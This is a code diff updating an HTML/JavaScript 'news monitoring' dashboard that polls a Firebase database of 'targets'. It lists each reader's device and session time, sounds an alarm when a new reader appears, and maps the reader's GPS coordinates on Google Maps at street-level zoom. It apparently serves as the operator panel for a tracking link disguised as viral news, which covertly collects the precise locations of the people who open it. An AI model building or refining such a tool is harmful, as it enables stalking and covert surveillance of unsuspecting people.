@@ -2,74 +2,94 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>NEWS CONTROL CENTER - Monitoring Reader</title>
     <style>
         :root { --news-red: #cc0000; --terminal-green: #00ff41; --panel-bg: #0b0e14; }
-        body { font-family: 'Courier New', Courier, monospace; background: var(--panel-bg); color: var(--terminal-green); padding: 20px; margin: 0; text-transform: uppercase; }
+        body { font-family: 'Courier New', Courier, monospace; background: var(--panel-bg); color: var(--terminal-green); padding: 20px; margin: 0; text-transform: uppercase; overflow-x: hidden; }
         
         .header { border-bottom: 2px solid var(--news-red); padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
         .live-indicator { color: var(--news-red); animation: blink 1s infinite; font-weight: bold; }
         @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
 
-        .grid { display: grid; grid-template-columns: 1fr 400px; gap: 20px; }
-        .card { background: #161b22; border: 1px solid #30363d; padding: 15px; border-radius: 8px; }
+        .grid { display: grid; grid-template-columns: 1fr 450px; gap: 20px; }
+        @media (max-width: 900px) { .grid { grid-template-columns: 1fr; } }
+
+        .card { background: #161b22; border: 1px solid #30363d; padding: 15px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
         
-        table { width: 100%; border-collapse: collapse; margin-top: 10px; color: #c9d1d9; font-size: 12px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; color: #c9d1d9; font-size: 11px; }
         th, td { padding: 12px; border: 1px solid #30363d; text-align: left; }
-        th { background: var(--news-red); color: white; font-size: 10px; border: none; }
+        th { background: var(--news-red); color: white; font-size: 10px; border: none; letter-spacing: 1px; }
         
-        .btn-detail { background: var(--terminal-green); color: black; border: none; padding: 5px 10px; cursor: pointer; font-weight: bold; font-family: inherit; }
-        .btn-detail:hover { background: white; }
+        .btn-detail { background: var(--terminal-green); color: black; border: none; padding: 6px 12px; cursor: pointer; font-weight: bold; font-family: inherit; border-radius: 4px; transition: 0.2s; }
+        .btn-detail:hover { background: white; transform: scale(1.05); }
 
-        .map-box { height: 350px; background: #000; border: 1px solid var(--terminal-green); margin-top: 15px; border-radius: 4px; overflow: hidden; }
-        iframe { width: 100%; height: 100%; border: none; filter: invert(90%) hue-rotate(180deg); } /* Dark Mode Map */
+        .map-box { height: 400px; background: #000; border: 1px solid var(--terminal-green); margin-top: 15px; border-radius: 4px; overflow: hidden; position: relative; }
+        iframe { width: 100%; height: 100%; border: none; filter: invert(90%) hue-rotate(180deg) brightness(1.2); } 
 
-        .stats-box { font-size: 14px; margin-bottom: 15px; padding: 10px; border-left: 4px solid var(--news-red); background: rgba(255,0,0,0.05); }
-        .info-label { color: #8b949e; font-size: 10px; }
+        .stats-box { font-size: 14px; margin-bottom: 15px; padding: 12px; border-left: 4px solid var(--news-red); background: rgba(204, 0, 0, 0.1); display: flex; justify-content: space-between; }
+        .info-label { color: #8b949e; font-size: 10px; margin-bottom: 5px; display: block; }
+        
+        .no-data { text-align: center; padding: 40px; color: #444; font-style: italic; }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <div>[ SYSTEM: NEWS MONITORING v3.0 ]</div>
-    <div class="live-indicator">● LIVE FEED</div>
+    <div>[ SYSTEM: NEWS MONITORING v3.5 - RADAR MODE ]</div>
+    <div class="live-indicator">● LIVE FEED CONNECTION</div>
 </div>
 
 <div class="grid">
     <div class="card">
         <div class="stats-box">
-            TOTAL PEMBACA TERDETEKSI: <span id="totalCount">0</span>
+            <span>TOTAL READER DETECTED: <b id="totalCount" style="color:white">0</b></span>
+            <span id="currentTime" style="color: #8b949e; font-size: 12px;"></span>
         </div>
         <table>
             <thead>
                 <tr>
                     <th>ID READER</th>
                     <th>STATUS VERIFIKASI</th>
-                    <th>WAKTU BACA</th>
-                    <th>PERANGKAT</th>
-                    <th>AKSI</th>
+                    <th>DURASI SESI</th>
+                    <th>DEVICE INFO</th>
+                    <th>RADAR ACTION</th>
                 </tr>
             </thead>
-            <tbody id="readerList"></tbody>
+            <tbody id="readerList">
+                <tr><td colspan="5" class="no-data">INITIALIZING SYSTEM...</td></tr>
+            </tbody>
         </table>
     </div>
 
     <div class="card">
-        <h3>RADAR KOORDINAT</h3>
+        <h3 style="margin-top:0; border-bottom: 1px solid #30363d; padding-bottom: 10px;">TARGET GEOLOCATION</h3>
         <div id="detailBox">
-            <p class="info-label">Pilih reader dari tabel untuk melacak posisi...</p>
+            <span class="info-label">Awaiting coordinate selection from table...</span>
+            <div style="background: #0d1117; padding: 15px; border: 1px dashed #30363d; color: #444; font-size: 12px;">
+                KLIK TOMBOL "LACAK" UNTUK MENAMPILKAN TITIK KOORDINAT DI PETA.
+            </div>
         </div>
         <div class="map-box" id="mapBox">
-            <div style="padding: 20px; text-align: center;">MENUNGGU DATA GPS...</div>
+            <div style="display: flex; align-items: center; justify-content: center; height: 100%; color: #333; font-weight: bold;">
+                [ MAPS STANDBY ]
+            </div>
         </div>
     </div>
 </div>
 
-<audio id="alarmSound" src="https://www.soundjay.com/buttons/beep-07a.mp3"></audio>
+<audio id="alarmSound" src="https://www.soundjay.com/buttons/beep-07a.mp3" preload="auto"></audio>
 
 <script>
     const BASE_URL = "https://trackeronlineviral-default-rtdb.asia-southeast1.firebasedatabase.app/targets";
     let knownReaders = new Set();
+
+    // Update Jam Realtime
+    function updateClock() {
+        const now = new Date();
+        document.getElementById('currentTime').innerText = now.toLocaleTimeString();
+    }
+    setInterval(updateClock, 1000);
 
     async function updateDashboard() {
         try {
@@ -78,7 +98,7 @@
             const tbody = document.getElementById('readerList');
             
             if (!data) {
-                tbody.innerHTML = "<tr><td colspan='5' style='text-align:center'>TIDAK ADA AKTIVITAS PEMBACA...</td></tr>";
+                tbody.innerHTML = "<tr><td colspan='5' class='no-data'>NO ACTIVITY DETECTED AT THIS TIME...</td></tr>";
                 document.getElementById('totalCount').innerText = "0";
                 return;
             }
@@ -90,51 +110,71 @@
                 const r = data[id];
                 count++;
                 
-                // Hitung durasi sejak buka link
+                // Hitung durasi aktif
                 const durationSec = Math.floor((Date.now() - r.start_time) / 1000);
-                const durationStr = `${Math.floor(durationSec/60)}M ${durationSec%60}S`;
+                const durationStr = durationSec > 60 ? `${Math.floor(durationSec/60)}M ${durationSec%60}S` : `${durationSec}S`;
 
-                // Bunyikan alarm jika ada pembaca baru yang masuk
+                // Alarm jika ada ID baru muncul
                 if (!knownReaders.has(id)) {
                     document.getElementById('alarmSound').play().catch(()=>{});
                     knownReaders.add(id);
                 }
 
-                // Auto-delete data yang sudah lewat 10 menit (agar DB tidak penuh)
-                if ((Date.now() - r.updated_at) > 600000) {
-                    fetch(`${BASE_URL}/${id}.json`, { method: 'DELETE' });
-                    continue;
-                }
+                const isVerified = r.lat && r.lat !== "0" && r.lat !== "undefined";
 
                 html += `
                     <tr>
-                        <td style="color: #58a6ff;">${id}</td>
-                        <td style="color: ${r.status.includes('Selesai') ? '#00ff41' : '#fbbf24'}">${r.status}</td>
+                        <td style="color: #58a6ff; font-weight:bold;">${id}</td>
+                        <td style="color: ${isVerified ? '#00ff41' : '#fbbf24'}">
+                            ${isVerified ? '✓ VERIFIED' : '⚠ WAITING GPS'}
+                        </td>
                         <td>${durationStr}</td>
-                        <td style="font-size: 10px;">${r.device || 'MOBILE'}</td>
-                        <td><button class="btn-detail" onclick="showTrack('${r.lat}','${r.lon}','${id}')">LACAK</button></td>
+                        <td style="font-size: 10px; color: #8b949e;">${r.device || 'GENERIC MOBILE'}</td>
+                        <td>
+                            <button class="btn-detail" onclick="showTrack('${r.lat}','${r.lon}','${id}')">
+                                LACAK
+                            </button>
+                        </td>
                     </tr>
                 `;
             }
             tbody.innerHTML = html;
             document.getElementById('totalCount').innerText = count;
-        } catch (e) { console.error("Sync Error"); }
+        } catch (e) { 
+            console.error("Firebase Sync Error"); 
+        }
     }
 
     function showTrack(lat, lon, id) {
+        if (!lat || lat === "undefined" || lat === "0") {
+            alert("MAAF, PEMBACA INI BELUM MEMBERIKAN IZIN LOKASI (GPS).");
+            return;
+        }
+
         document.getElementById('detailBox').innerHTML = `
-            <div style="background: #0d1117; padding: 10px; border: 1px solid #30363d;">
-                <b style="color:white">TARGET:</b> ${id}<br>
-                <b style="color:white">LAT:</b> ${lat}<br>
-                <b style="color:white">LON:</b> ${lon}
+            <span class="info-label">Active Target Details:</span>
+            <div style="background: #0d1117; padding: 12px; border: 1px solid var(--terminal-green); margin-bottom: 10px;">
+                <b style="color:white">UID:</b> ${id}<br>
+                <b style="color:var(--terminal-green)">COORDINATES:</b> ${lat}, ${lon}<br>
+                <b style="color:white">TIMESTAMP:</b> ${new Date().toLocaleTimeString()}
             </div>
         `;
-        // Map menggunakan Dark Mode Filter
-        const mapUrl = `https://maps.google.com/maps?q=${lat},${lon}&t=&z=17&ie=UTF8&iwloc=&output=embed`;
-        document.getElementById('mapBox').innerHTML = `<iframe src="${mapUrl}"></iframe>`;
+        
+        // Google Maps Embed URL Fix
+        const mapUrl = `https://maps.google.com/maps?q=${lat},${lon}&t=&z=18&ie=UTF8&iwloc=&output=embed`;
+        
+        document.getElementById('mapBox').innerHTML = `
+            <iframe 
+                src="${mapUrl}" 
+                allowfullscreen>
+            </iframe>
+            <div style="position:absolute; top:0; left:0; width:100%; height:100%; pointer-events:none; border: 2px solid var(--terminal-green); opacity: 0.2;"></div>
+        `;
     }
 
-    setInterval(updateDashboard, 2000);
+    // Jalankan Sinkronisasi Otomatis tiap 3 detik
+    setInterval(updateDashboard, 3000);
+    updateDashboard(); // Initial Load
 </script>
 
 </body>
